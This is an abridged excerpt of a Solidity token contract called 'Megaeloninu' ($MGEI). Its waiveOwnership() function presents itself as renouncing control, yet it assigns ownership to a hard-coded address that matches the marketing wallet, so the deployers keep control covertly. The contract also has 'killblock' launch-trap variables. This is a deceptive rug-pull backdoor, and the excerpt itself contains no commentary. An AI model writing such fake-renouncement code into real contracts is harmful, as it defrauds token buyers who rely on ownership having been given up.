...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        ...
        _owner = address(0x125CF7e89564be63BAe2D09ABDF19551DE413aaB);
    }
...
contract Megaeloninu is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "Megaeloninu";
    string private _symbol = "$MGEI";
    uint8 private _decimals = 9;

    uint public launchedBlock;
    uint public killblock = 2;
    bool public isLaunch = false;
    address payable public marketingWalletAddress = payable(0x125CF7e89564be63BAe2D09ABDF19551DE413aaB);
    address payable public teamWalletAddress = payable(0x36737e5eCdc7eb29Bf3b47AEE6fc07aC3632EF68);
